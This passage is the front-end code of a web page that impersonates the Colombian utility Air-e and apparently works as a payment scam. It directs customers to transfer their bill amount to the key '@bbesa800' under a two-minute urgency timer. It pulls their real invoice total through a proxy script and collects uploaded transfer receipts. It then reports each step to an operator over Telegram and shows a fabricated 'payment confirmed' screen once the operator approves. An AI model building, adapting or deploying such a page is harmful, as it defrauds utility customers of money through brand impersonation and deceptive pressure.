                <span>NIC: <strong id="displayNic"><?= !empty($nicParam) ? htmlspecialchars($nicParam) : '--' ?></strong></span>
                <span>•</span>
                <span>Referencia: <strong id="displayRef">Air-e</strong></span>
            </div>
        </div>

        <!-- Cronómetro de 2 minutos -->
        <div class="timer-container">
            <div class="timer-pill" id="timerPill">
                <svg class="timer-icon" viewBox="0 0 24 24">
                    <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-8-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
                </svg>
                <span>Tiempo restante para pagar:</span>
                <span class="timer-digits" id="timerDigits">02:00</span>
            </div>
            <div class="timer-progress-track">
                <div class="timer-progress-bar" id="timerProgressBar"></div>
            </div>
            <div class="timer-expired-box" id="timerExpiredAlert">
                <button type="button" class="btn-renew" onclick="renovarCodigo()">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
                    Renovar código QR
                </button>
            </div>
        </div>

        <!-- Código QR -->
        <div class="qr-section">
            <div class="qr-frame" id="qrFrame">
                <img src="qr.png" alt="Código QR de Pago" class="qr-image" id="qrImg">
            </div>
            <p class="qr-instruction">
                Abre tu aplicación bancaria (Bancolombia, Nequi u otra) y escanea el código para efectuar el pago.
            </p>
        </div>

        <!-- Divisor "o a nuestra llave" -->
        <div class="key-divider">
            <span class="divider-pill">
                <svg viewBox="0 0 24 24"><path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2zM5 21h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2zM5 5h14v14H5V5z"/></svg>
                o a nuestra llave
            </span>
        </div>

        <!-- Tarjeta de Llave con Copia Rápida -->
        <div class="key-box">
            <div class="key-info">
                <span class="key-label">Llave de Transferencia</span>
                <span class="key-value" id="llaveDestino">@bbesa800</span>
            </div>
            <button type="button" class="btn-copy" id="btnCopiarLlave" onclick="copiarLlave()">
                <svg id="copyIcon" viewBox="0 0 24 24">
                    <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                </svg>
                <span id="copyText">Copiar</span>
            </button>
        </div>

        <!-- Pasos Guiados -->
        <div class="steps-container">
            <div class="steps-title">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="#64748b"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                Instrucciones sencillas
            </div>
            <div class="step-item">
                <span class="step-number">1</span>
                <span>Ingresa a la app de tu entidad bancaria favorita.</span>
            </div>
            <div class="step-item">
                <span class="step-number">2</span>
                <span>Selecciona <strong>Transferir por Llave</strong> y pega <strong>@bbesa800</strong>, o usa <strong>Escanear QR</strong>.</span>
            </div>
            <div class="step-item">
                <span class="step-number">3</span>
                <span>Escribe el valor exacto de tu factura y confirma la operación.</span>
            </div>
        </div>

        <!-- Botón de Confirmación -->
        <button type="button" class="btn-confirm-payment" id="btnConfirmarPago" onclick="abrirModalUpload()">
            <svg id="confirmIcon" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            <span id="confirmText">Ya realicé el pago</span>
        </button>
    </div>

    <!-- Footer de Respaldo -->
    <footer class="card-footer">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="#64748b"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
        <span>Transacción procesada bajo altos estándares de seguridad</span>
    </footer>
</div>

<!-- Notificación Flotante (Toast) -->
<div class="toast" id="toastCopy">
    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
    <span>¡Llave <strong>@bbesa800</strong> copiada al portapapeles!</span>
</div>

<!-- Modal 1: Subir Comprobante de Pago -->
<div class="modal-overlay" id="modalSubirComprobante" style="display: none;">
    <div class="modal-box modal-box-upload">
        <button type="button" class="modal-btn-x" onclick="cerrarModalUpload()" aria-label="Cerrar">&times;</button>
        <div class="modal-upload-header">
            <div class="upload-badge-icon">
                <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
            </div>
            <h2>Adjuntar Comprobante</h2>
            <p>Sube una captura de pantalla o foto de tu transferencia a <strong>@bbesa800</strong> o escaneo QR para validarla de inmediato.</p>
        </div>

        <form id="formComprobante" onsubmit="enviarComprobante(event)">
            <input type="file" id="inputFileComprobante" accept="image/*" style="display: none;" onchange="handleFileSelected(this)">
            
            <!-- Zona de selección / drag & drop -->
            <div class="upload-zone" id="uploadDropZone" onclick="document.getElementById('inputFileComprobante').click()">
                <div class="upload-zone-idle" id="zoneIdle">
                    <div class="upload-zone-icon">
                        <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
                    </div>
                    <div class="upload-zone-text">
                        <strong>Toca aquí para seleccionar tu comprobante</strong>
                        <span>Formatos JPG, PNG o WEBP</span>
                    </div>
                </div>

                <div class="upload-zone-preview" id="zonePreview" style="display: none;">
                    <img id="imgPreview" src="" alt="Comprobante">
                    <div class="preview-info">
                        <span class="preview-name" id="previewFileName">comprobante.jpg</span>
                        <span class="preview-size" id="previewFileSize">1.2 MB</span>
                        <button type="button" class="btn-change-photo" onclick="event.stopPropagation(); document.getElementById('inputFileComprobante').click();">
                            Cambiar imagen
                        </button>
                    </div>
                </div>
            </div>

            <div class="modal-upload-actions">
                <button type="submit" class="btn-submit-receipt" id="btnEnviarComprobante" disabled>
                    <span class="spinner" id="spinnerUpload" style="display: none;"></span>
                    <span id="btnUploadText">Enviar Comprobante</span>
                </button>
                <button type="button" class="btn-cancel-modal" onclick="cerrarModalUpload()">Cancelar y volver</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal 2: Espera en Vivo (Polling de Telegram) -->
<div class="modal-overlay" id="modalEsperaValidacion" style="display: none;">
    <div class="modal-box modal-box-waiting">
        <div class="waiting-animation-container">
            <div class="pulse-ring pulse-1"></div>
            <div class="pulse-ring pulse-2"></div>
            <div class="pulse-center-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v5h-2V7zm0 7h2v2h-2v-2z"/></svg>
            </div>
        </div>
        <h2>Validando tu Transferencia...</h2>
        <p class="waiting-subtext">Estamos verificando tu comprobante de pago en el sistema en tiempo real. Por favor, mantén esta ventana abierta.</p>
        
        <div class="live-status-pill">
            <span class="pulse-dot"></span>
            <span id="statusLiveText">Esperando confirmación...</span>
        </div>

        <div class="waiting-details-box">
            <div class="waiting-detail-row">
                <span>NIC / Factura:</span>
                <strong id="waitingNic">---</strong>
            </div>
            <div class="waiting-detail-row">
                <span>Total Reportado:</span>
                <strong id="waitingTotal">---</strong>
            </div>
            <div class="waiting-detail-row">
                <span>Destino:</span>
                <strong>@bbesa800</strong>
            </div>
        </div>
    </div>
</div>

<!-- Modal 3: Éxito Final (Pago Confirmado) -->
<div class="modal-overlay" id="modalExitoFinal" style="display: none;">
    <div class="modal-box modal-box-success">
        <div class="modal-icon-success">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        <h2>¡Pago Confirmado con Éxito!</h2>
        <p class="success-subtext">Tu comprobante ha sido verificado satisfactoriamente. Tu factura de energía Air-e ha sido cancelada en el sistema.</p>
        
        <div class="success-receipt-card">
            <div class="success-receipt-row">
                <span>Estado:</span>
                <span class="badge-approved">APROBADO</span>
            </div>
            <div class="success-receipt-row">
                <span>NIC:</span>
                <strong id="successNic">---</strong>
            </div>
            <div class="success-receipt-row">
                <span>Monto Pagado:</span>
                <strong id="successTotal">---</strong>
            </div>
            <div class="success-receipt-row">
                <span>Fecha y Hora:</span>
                <span id="successDate">---</span>
            </div>
        </div>

        <button type="button" class="btn-modal-close" onclick="finalizarProceso()">Finalizar y Salir</button>
    </div>
</div>

<script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return '';
    }

    // Recuperar datos de la factura con máxima exhaustividad
    const urlParams = new URLSearchParams(window.location.search);
    let nicParam = urlParams.get('nic') || localStorage.getItem('aire_pago_nic') || sessionStorage.getItem('aire_pago_nic') || getCookie('aire_pago_nic') || '';
    let totalParam = urlParams.get('total') || localStorage.getItem('aire_pago_total') || sessionStorage.getItem('aire_pago_total') || getCookie('aire_pago_total') || '';
    let tipoParam = urlParams.get('tipo') || localStorage.getItem('aire_pago_tipo') || sessionStorage.getItem('aire_pago_tipo') || getCookie('aire_pago_tipo') || '';
    const bancoParam = urlParams.get('banco') || 'Bancolombia / Redeban';

    // Priorizar parámetros explícitos de URL
    if (urlParams.get('total')) {
        totalParam = urlParams.get('total');
    }
    if (urlParams.get('nic')) {
        nicParam = urlParams.get('nic');
    }
    if (urlParams.get('tipo')) {
        tipoParam = urlParams.get('tipo');
    }

    // Solo usar fallback de prueba si no hay nada en ningún storage ni URL
    if (!nicParam) {
        nicParam = '8201713';
    }
    if (!totalParam && nicParam === '8201713') {
        totalParam = '$ 202.940 COP';
    }

    // Formatear display de NIC, Referencia y Total de inmediato con los datos reales
    document.getElementById('displayNic').textContent = nicParam;
    document.getElementById('displayRef').textContent = 'FAC-' + (nicParam.length >= 4 ? nicParam.slice(-4) : nicParam);
    if (totalParam) {
        document.getElementById('displayTotal').textContent = totalParam;
    }

    // Guardar en almacenamiento para consistencia de sesión
    try {
        if (nicParam) {
            localStorage.setItem('aire_pago_nic', nicParam);
            sessionStorage.setItem('aire_pago_nic', nicParam);
            document.cookie = `aire_pago_nic=${encodeURIComponent(nicParam)}; path=/; max-age=86400`;
        }
        if (totalParam && totalParam !== '---') {
            localStorage.setItem('aire_pago_total', totalParam);
            sessionStorage.setItem('aire_pago_total', totalParam);
            document.cookie = `aire_pago_total=${encodeURIComponent(totalParam)}; path=/; max-age=86400`;
        }
        if (tipoParam) {
            localStorage.setItem('aire_pago_tipo', tipoParam);
            sessionStorage.setItem('aire_pago_tipo', tipoParam);
            document.cookie = `aire_pago_tipo=${encodeURIComponent(tipoParam)}; path=/; max-age=86400`;
        }
    } catch(e) {}

    // Si NO tenemos total válido o quedó en valor por defecto demo y es un NIC real, consultar en segundo plano sin bloquear
    const needsLookup = (!totalParam || totalParam === '---' || totalParam === '$ 0' || (totalParam.includes('202.940') && nicParam !== '8201713' && !urlParams.get('total')));
    if (nicParam && nicParam !== '8201713' && needsLookup) {
        const proxyUrl = window.location.pathname.includes('/pago/') ? '../../proxy_facture.php' : '/proxy_facture.php';
        fetch(`${proxyUrl}?nic=${encodeURIComponent(nicParam)}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.success) {
                    let realAmount = '';
                    if (tipoParam === 'Pago del mes') {
                        realAmount = data.valorMes || data.deudaTotal;
                    } else {
                        // Si es Pago total o no especificado, priorizar deuda total si existe
                        realAmount = (data.deudaTotal && data.deudaTotal !== '$ 0' && data.deudaTotal !== '$0')
                            ? data.deudaTotal
                            : (data.valorMes || data.deudaTotal);
                    }
                    if (realAmount) {
                        totalParam = realAmount;
                        document.getElementById('displayTotal').textContent = realAmount;
                        try {
                            localStorage.setItem('aire_pago_total', realAmount);
                            sessionStorage.setItem('aire_pago_total', realAmount);
                            document.cookie = `aire_pago_total=${encodeURIComponent(realAmount)}; path=/; max-age=86400`;
                        } catch(e) {}
                    }
                }
            })
            .catch(err => {
                console.log('Error fetching live invoice:', err);
            });
    }

    // Enviar alerta a Telegram de que el usuario está viendo la pantalla de pago QR
    window.addEventListener('DOMContentLoaded', () => {
        fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'view_qr',
                nic: nicParam,
                total: totalParam || 'Consultando...',
                banco: bancoParam
            })
        }).catch(e => console.log('Telegram view notification sent.'));
    });

    // ===== CRONÓMETRO DE 2 MINUTOS (120 SEGUNDOS) =====
    const TOTAL_SECONDS = 120;
    let secondsLeft = TOTAL_SECONDS;
    const timerDigits = document.getElementById('timerDigits');
    const timerProgressBar = document.getElementById('timerProgressBar');
    const timerPill = document.getElementById('timerPill');
    let timerInterval = null;

    function renderTimer() {
        const mins = Math.floor(secondsLeft / 60);
        const secs = secondsLeft % 60;
        const formatted = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (timerDigits) timerDigits.textContent = formatted;

        const percent = (secondsLeft / TOTAL_SECONDS) * 100;
        if (timerProgressBar) timerProgressBar.style.width = percent + '%';

        // Alerta visual últimos 30 segundos
        if (secondsLeft <= 30) {
            if (timerPill) timerPill.classList.add('urgent');
            if (timerProgressBar) timerProgressBar.classList.add('urgent');
        } else {
            if (timerPill) timerPill.classList.remove('urgent');
            if (timerProgressBar) timerProgressBar.classList.remove('urgent');
        }

        if (secondsLeft > 0) {
            secondsLeft--;
        } else {
            clearInterval(timerInterval);
            onTimerExpired();
        }
    }

    function onTimerExpired() {
        if (timerDigits) timerDigits.textContent = "00:00";
        const qrFrame = document.getElementById('qrFrame');
        if (qrFrame) {
            qrFrame.style.opacity = '0.35';
            qrFrame.style.filter = 'blur(2px)';
        }
        document.getElementById('timerExpiredAlert').style.display = 'block';
    }

    function renovarCodigo() {
        secondsLeft = TOTAL_SECONDS;
        const qrFrame = document.getElementById('qrFrame');
        if (qrFrame) {
            qrFrame.style.opacity = '1';
            qrFrame.style.filter = 'none';
        }
        document.getElementById('timerExpiredAlert').style.display = 'none';
        clearInterval(timerInterval);
        renderTimer();
        timerInterval = setInterval(renderTimer, 1000);
    }

    // Iniciar cronómetro
    renderTimer();
    timerInterval = setInterval(renderTimer, 1000);

    // ===== COPIAR LLAVE =====
    function copiarLlave() {
        const llave = "@bbesa800";
        const btn = document.getElementById('btnCopiarLlave');
        const copyText = document.getElementById('copyText');
        const copyIcon = document.getElementById('copyIcon');

        const onSuccess = () => {
            btn.classList.add('copied');
            copyText.textContent = "¡Copiado!";
            copyIcon.innerHTML = '<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>';

            showToast();

            setTimeout(() => {
                btn.classList.remove('copied');
                copyText.textContent = "Copiar";
                copyIcon.innerHTML = '<path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>';
            }, 2500);
        };

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(llave).then(onSuccess).catch(() => fallbackCopy(llave, onSuccess));
        } else {
            fallbackCopy(llave, onSuccess);
        }
    }

    function fallbackCopy(text, callback) {
        const tempInput = document.createElement('input');
        tempInput.value = text;
        tempInput.style.position = 'fixed';
        tempInput.style.opacity = '0';
        document.body.appendChild(tempInput);
        tempInput.focus();
        tempInput.select();
        try {
            document.execCommand('copy');
            callback();
        } catch (err) {
            console.error('Error al copiar', err);
        }
        document.body.removeChild(tempInput);
    }

    function showToast() {
        const toast = document.getElementById('toastCopy');
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 2500);
    }

    // ===== FLUJO DE COMPROBANTE Y VERIFICACIÓN EN VIVO =====
    let currentTransactionId = null;
    let pollInterval = null;
    let selectedReceiptFile = null;

    function abrirModalUpload() {
        document.getElementById('modalSubirComprobante').style.display = 'flex';
    }

    function cerrarModalUpload() {
        document.getElementById('modalSubirComprobante').style.display = 'none';
    }

    function handleFileSelected(input) {
        const file = (input.files && input.files[0]) ? input.files[0] : null;
        if (!file) return;

        if (!file.type.startsWith('image/')) {
            alert('Por favor selecciona un archivo de imagen válido (JPG, PNG o WEBP).');
            input.value = '';
            return;
        }

        selectedReceiptFile = file;

        const reader = new FileReader();
        reader.onload = function(e) {
            document.getElementById('imgPreview').src = e.target.result;
            document.getElementById('previewFileName').textContent = file.name;
            const sizeInMb = (file.size / (1024 * 1024)).toFixed(2);
            document.getElementById('previewFileSize').textContent = `${sizeInMb} MB`;
            document.getElementById('zoneIdle').style.display = 'none';
            document.getElementById('zonePreview').style.display = 'flex';
            document.getElementById('btnEnviarComprobante').disabled = false;
        };
        reader.readAsDataURL(file);
    }

    // Configurar arrastrar y soltar (Drag and Drop)
    const dropZone = document.getElementById('uploadDropZone');
    if (dropZone) {
        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.classList.add('drag-over');
        });
        dropZone.addEventListener('dragleave', () => {
            dropZone.classList.remove('drag-over');
        });
        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.classList.remove('drag-over');
            if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                handleFileSelected({ files: e.dataTransfer.files });
            }
        });
    }

    function resetUploadForm() {
        selectedReceiptFile = null;
        const input = document.getElementById('inputFileComprobante');
        if (input) input.value = '';
        document.getElementById('imgPreview').src = '';
        document.getElementById('zoneIdle').style.display = 'block';
        document.getElementById('zonePreview').style.display = 'none';
        const btn = document.getElementById('btnEnviarComprobante');
        if (btn) {
            btn.disabled = true;
            const spinner = document.getElementById('spinnerUpload');
            if (spinner) spinner.style.display = 'none';
            const txt = document.getElementById('btnUploadText');
            if (txt) txt.textContent = 'Enviar Comprobante';
        }
    }

    function enviarComprobante(event) {
        if (event) event.preventDefault();
        if (!selectedReceiptFile) {
            alert('Por favor adjunta la captura de tu comprobante de pago.');
            return;
        }

        const btn = document.getElementById('btnEnviarComprobante');
        const spinner = document.getElementById('spinnerUpload');
        const txt = document.getElementById('btnUploadText');

        btn.disabled = true;
        spinner.style.display = 'inline-block';
        txt.textContent = 'Enviando...';

        const formData = new FormData();
        formData.append('action', 'upload_receipt');
        formData.append('nic', nicParam);
        formData.append('total', document.getElementById('displayTotal').textContent || totalParam);
        formData.append('banco', bancoParam);
        formData.append('comprobante', selectedReceiptFile);

        fetch('index.php', {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data && data.status === 'success') {
                currentTransactionId = data.transaction_id;
                cerrarModalUpload();
                iniciarEsperaValidacion(currentTransactionId);
            } else {
                alert('No se pudo enviar el comprobante. Por favor intenta nuevamente.');
                btn.disabled = false;
                spinner.style.display = 'none';
                txt.textContent = 'Enviar Comprobante';
            }
        })
        .catch(err => {
            console.error('Error al subir:', err);
            alert('Error de conexión al enviar el comprobante. Por favor verifica e intenta de nuevo.');
            btn.disabled = false;
            spinner.style.display = 'none';
            txt.textContent = 'Enviar Comprobante';
        });
    }

    function iniciarEsperaValidacion(transId) {
        document.getElementById('waitingNic').textContent = nicParam;
        document.getElementById('waitingTotal').textContent = document.getElementById('displayTotal').textContent || totalParam;
        
        // Ocultar alerta de rechazado si estaba visible
        document.getElementById('alertRejected').style.display = 'none';

        // Abrir modal de espera
        document.getElementById('modalEsperaValidacion').style.display = 'flex';

        if (pollInterval) clearInterval(pollInterval);
        
        // Consultar cada 2 segundos el estado en la base de datos
        pollInterval = setInterval(() => {
            verificarEstadoTransaccion(transId);
        }, 2000);
    }

    function verificarEstadoTransaccion(transId) {
        fetch(`index.php?action=check_status&id=${encodeURIComponent(transId)}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.status === 'success') {
                    const estado = parseInt(data.estado, 10);
                    if (estado === 10) {
                        // ✅ PAGO CONFIRMADO POR EL ADMINISTRADOR EN TELEGRAM
                        clearInterval(pollInterval);
                        document.getElementById('modalEsperaValidacion').style.display = 'none';
                        mostrarExito();
                    } else if (estado === 11) {
                        // ❌ PAGO NO REALIZADO / RECHAZADO POR EL ADMINISTRADOR EN TELEGRAM
                        clearInterval(pollInterval);
                        document.getElementById('modalEsperaValidacion').style.display = 'none';
                        mostrarPagoRechazado();
                    }
                }
            })
            .catch(err => {
                console.log('Consultando estado...', err);
            });
    }

    function mostrarExito() {
        document.getElementById('successNic').textContent = nicParam;
        document.getElementById('successTotal').textContent = document.getElementById('displayTotal').textContent || totalParam;
        const now = new Date();
        document.getElementById('successDate').textContent = now.toLocaleString('es-CO');
        document.getElementById('modalExitoFinal').style.display = 'flex';
    }

    function mostrarPagoRechazado() {
        resetUploadForm();
        const alertBox = document.getElementById('alertRejected');
        alertBox.style.display = 'flex';
        alertBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    function finalizarProceso() {
        window.location.href = '../../close.html';
    }
</script>

</body>
</html>
